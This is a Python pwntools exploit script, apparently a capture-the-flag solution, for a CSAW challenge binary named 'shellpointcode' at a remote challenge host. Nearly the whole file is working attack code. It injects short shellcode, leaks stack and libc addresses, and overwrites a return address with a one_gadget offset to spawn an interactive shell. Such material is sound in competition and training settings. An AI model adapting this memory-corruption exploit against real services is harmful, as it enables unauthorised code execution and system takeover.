#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./shellpointcode"
libcPath = "./libc6_2.27-3ubuntu1_amd64.so"
remoteAddr = "pwn.chal.csaw.io"
remotePort = 9005

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

if __name__ == "__main__":

    #  DEBUG([0x8EE, 0x8CF], True)
    node1 = asm('''
            add rsp, 0x38
            mov bx, 0x22d
            add [rsp], rbx
            ret 
            ''')
    assert len(node1) <= 15
    io.sendlineafter("node 1:  \n", node1)

    node2 = '0' * 15
    assert len(node2) <= 15
    io.sendlineafter("node 2: \n", node2)

    io.recvuntil("next: ")
    stack = int(io.recvline().strip(), 16)
    success("stack", stack)

    io.sendlineafter("?\n", '1' * 3 + p64(stack - 0x78 + 0x20) + p64(stack + 0x28))
    io.recvuntil("next: ")
    _IO_2_1_stdin_ = int(io.recvline().strip(), 16)
    success("_IO_2_1_stdin_", _IO_2_1_stdin_)
    libc.address = _IO_2_1_stdin_ - libc.sym['_IO_2_1_stdin_']
    success("libc", libc.address)
    
    one_gadget = 0x4f2c5
    io.sendlineafter("?\n", '2' * 11 + p64(libc.address + one_gadget))
    #  io.sendlineafter("?\n", '1' * 3 + p64(stack + 0x68) + p64(stack + 0x28))
    #  io.recvuntil("next: ")
    #  elf.address = int(io.recvline().strip(), 16) - 0x9bc
    #  success("elf", elf.address)

    io.interactive()
